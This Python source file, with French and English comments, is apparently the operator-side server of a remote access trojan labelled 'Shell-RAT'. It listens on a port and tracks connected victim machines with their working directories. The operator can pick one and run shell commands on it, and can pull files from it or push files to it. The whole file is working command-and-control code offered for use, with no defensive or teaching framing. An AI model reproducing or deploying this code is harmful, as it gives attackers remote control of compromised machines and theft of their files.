import socket, subprocess, re, os, tabulate, tqdm
from datetime import datetime
from threading import Thread


SERVER_HOST = "0.0.0.0" # Ecoute sur toutes les interfaces 
SERVER_PORT = 2024      # Port d'écoute 
BUFFER_SIZE = 1440      # Taille MTU
SEPARATOR   = "<sep>"   # séparateur pour les données echangé 


class Server:
   
    def __init__(self, host, port):
        self.host = host
        self.port = port
        # Initialisation du socket 
        self.server_socket = self.get_server_socket()

        # Dictionnaire pour mapper chaque client avec son socket 
        self.clients = {}
        # Dictionnaire pour mapper chaque client avec son working directory 
        self.clients_cwd = {}
        # Client selectionner par le server, le client son selectionne via leur indices 
        self.current_client = None
    
    def get_server_socket(self, custom_port=None):
        """
            Cette methode sera utiliser pour lier le socket server sur celui du client 
            Le client se lie au port server d'ecoute 
            Donc le server egalement doit se lier au port utiliser par client 
        """ 
        # Creation du socket 
        s = socket.socket()
        if custom_port: # Si un client tente une connexion alors le socket se creer avec son port 
            port = custom_port
        else: # Si aucun client n'est en ligne alors conserver le socket du server 
            port = self.port
        # Liaison de l'interface server au socket 
        s.bind((self.host, port))
        # Rendre le socket reutilisable
        # Pour permettre a un ancienne client de se connecter a nouveau 
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.listen()
        print("\n\n")
        print(f" Server en ecoute sur : [{SERVER_HOST}:{port} ] ".center(80,'~'))
        return s
    
    def accept_connection(self):
        while True:
            # Accepter une connexion entamer par un client 
            try:
                client_socket, client_address = self.server_socket.accept()
            except OSError as e:
                print(" ! Server socket fermer ! ".center())
                break
            print(" \n\n ")
            print(tabulate.tabulate(
                                [
                                    [  
                                        "Nouveau client connecté !", 
                                        f" {client_address[0]}:{client_address[1]}", 
                                        f"{datetime.now().time()}"
                                    ]
                                ],

                                headers = [
                                            "Notification", 
                                            "Détails",
                                            "Time"
                                ]
            ))
            # Reception du repertoire de travail du client 
            cwd = client_socket.recv(BUFFER_SIZE).decode()
            print("[+] Working directory en cours : ", cwd)
            # Ajout du client au dictionnaire 
            self.clients[client_address] = client_socket
            self.clients_cwd[client_address] = cwd

    def accept_connections(self):
        # Accepter les nouveaux clients avec des threads separer (Multithreading)
        self.connection_thread = Thread(target=self.accept_connection) 
        # Rendre les thread executable en Arriere-plan comme processus daemon(Asynchronisme)
        self.connection_thread.daemon = True
        self.connection_thread.start()
    
    def close_connections(self):
        # Fermeture de toutes les connexions initialise avec des clients 
        for _, client_socket in self.clients.items():
            client_socket.close()
        self.server_socket.close()
    
    def start_interpreter(self):
        """ Interface de communicatiomn avec le client """
        while True:
            try : 
                command = input("\n\t [.-Shell-RAT-.]  (*_*) > ") # Invite de commande 
            except KeyboardInterrupt as e: 
                print("\n\n")
                conf = input("\n\t\t Confirmer la fermeture d'urgence ...( Y / N ) > ").lower().lstrip()
                if conf in ["yes",'oui','y','o']:
                    try : 
                        self.close_connections()
                    except Exception as e : # +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[ BUG NON CORRIGER ]
                        pass 
                    else : 
                        print(" Fermeture du server ")
                        #chargement(message=" Fermeture des socket ... ")
                        #chargement(message=" Shutdown du server RAT ...")
            
            if command.strip().lower() in ['help', 'aide', 'h']:
                print("""
                                PAGE EN COURS 

                        """)


            if re.search(r"list\w*", command) or re.search(r"showall\w*", command):
                # Lister tous les clients actifs 
                connected_clients = []
                for index, ((client_host, client_port), cwd) in enumerate(self.clients_cwd.items()):
                    connected_clients.append([index, client_host,client_port, cwd])
                    # Affichage des clients dans un tableau formatter 
                    print(tabulate.tabulate(connected_clients, headers=[" Index "," Addresse ", " Port ", " CWD "]))

            elif (match := re.search(r"use\s*(\w*)", command)):
                try:
                    # get the index passed to the command
                    client_index = int(match.group(1))
                except ValueError:
                    # there is no digit after the use command
                    print("Please insert the index of the client, a number.")
                    continue
                else:
                    try:
                        self.current_client = list(self.clients)[client_index]
                    except IndexError:
                        print(f"Please insert a valid index, maximum is {len(self.clients)}.")
                        continue
                    else:
                        # start the reverse shell as self.current_client is set
                        self.start_reverse_shell()
            
            elif command.lower() in ["exit", "quit"]:
                # exit out of the interpreter if exit|quit are passed
                break
            elif command == "":
                # do nothing if command is empty (i.e a new line)
                pass
            else:
                print("\t\t >>  [info] : Commande invalide :( ! ", command)
        self.close_connections()

    def start(self):
        """
            Method responsible for starting the server:
            Accepting client connections and starting the main interpreter
        """
        self.accept_connections()
        self.start_interpreter()
    
    def start_reverse_shell(self):
        # get the current working directory from the current client
        cwd = self.clients_cwd[self.current_client]
        # get the socket too
        client_socket = self.clients[self.current_client]
        while True:
            # get the command from prompt
            command = input(f"{cwd} $> ")
            if not command.strip():
                # empty command
                continue
            if (match := re.search(r"local\s*(.*)", command)):
                local_command = match.group(1)
                if (cd_match := re.search(r"cd\s*(.*)", local_command)):
                    # if it's a 'cd' command, change directory instead of using subprocess.getoutput
                    cd_path = cd_match.group(1)
                    if cd_path:
                        os.chdir(cd_path)
                else:
                    local_output = subprocess.getoutput(local_command)
                    print(local_output)
                # if it's a local command (i.e starts with local), do not send it to the client
                continue
            # send the command to the client
            client_socket.sendall(command.encode())
            if command.lower() in ["exit", "quit"]:
                # if the command is exit, just break out of the loop
                break
            elif command.lower() == "abort":# if the command is abort, remove the client from the dicts & exit
                del self.clients[self.current_client]
                del self.clients_cwd[self.current_client]
                break
            elif (match := re.search(r"download\s*(.*)", command)):
                # receive the file
                self.receive_file()
            elif (match := re.search(r"download\s*(.*)", command)):
                # receive the file
                self.receive_file()
            elif (match := re.search(r"upload\s*(.*)", command)):
                # send the specified file if it exists
                filename = match.group(1)
                if not os.path.isfile(filename):
                    print(f"The file {filename} does not exist in the local machine.")
                else:
                    self.send_file(filename)
            # retrieve command results
            output = self.receive_all_data(client_socket,BUFFER_SIZE).decode()
            # split command output and current directory
            results, cwd = output.split(SEPARATOR)
            # update the cwd
            self.clients_cwd[self.current_client] = cwd
            # print output
            print(results)
        self.current_client = None
    
    def receive_all_data(self, socket, buffer_size):
        """
            Function responsible for calling socket.recv()
            repeatedly until no data is to be received
        """
        data = b""
        while True:
            output = socket.recv(buffer_size)
            data += output
            if not output or len(output) < buffer_size:
                break
        return data
    
    def receive_file(self, port=2023):
        # make another server socket with a custom port
        s = self.get_server_socket(custom_port=port)
        # accept client connections
        client_socket, client_address = s.accept()
        print(f"{client_address} connected.")
        # receive the file
        Server._receive_file(client_socket)
    
    def send_file(self, filename, port=2023):
        # make another server socket with a custom port
        s = self.get_server_socket(custom_port=port)
        # accept client connections
        client_socket, client_address = s.accept()
        print(f"{client_address} connected.")
        # receive the file
        Server._send_file(client_socket, filename)
    
    @classmethod
    def _receive_file(cls, s: socket.socket, buffer_size=4096):
        # receive the file infos using socket
        received = s.recv(buffer_size).decode()
        filename, filesize = received.split(SEPARATOR)
        # remove absolute path if there is
        filename = os.path.basename(filename)
        # convert to integer
        filesize = int(filesize)
        # start receiving the file from the socket
        # and writing to the file stream
        progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
        with open(filename, "wb") as f:
            while True:
                # read 1024 bytes from the socket (receive)
                bytes_read = s.recv(buffer_size)
                if not bytes_read:
                    # nothing is received
                    # file transmitting is done
                    break
                # write to the file the bytes we just received
                f.write(bytes_read)
                # update the progress bar
                progress.update(len(bytes_read))
        # close the socket
        s.close()

    @classmethod
    def _send_file(cls, s: socket.socket, filename, buffer_size=4096):
        # get the file size
        filesize = os.path.getsize(filename)
        # send the filename and filesize
        s.send(f"{filename}{SEPARATOR}{filesize}".encode())
        # start sending the file
        progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
        with open(filename, "rb") as f:
            while True:
                # read the bytes from the file
                bytes_read = f.read(buffer_size)
                if not bytes_read:
                    # file transmitting is done
                    break
                # we use sendall to assure transimission in
                # busy networks
                s.sendall(bytes_read)
                # update the progress bar
                progress.update(len(bytes_read))
        # close the socket
        s.close()

if __name__ == "__main__":
    try : 
        server = Server(SERVER_HOST, SERVER_PORT)
        server.start()
    except Exception as e :
        server.close_connections()
    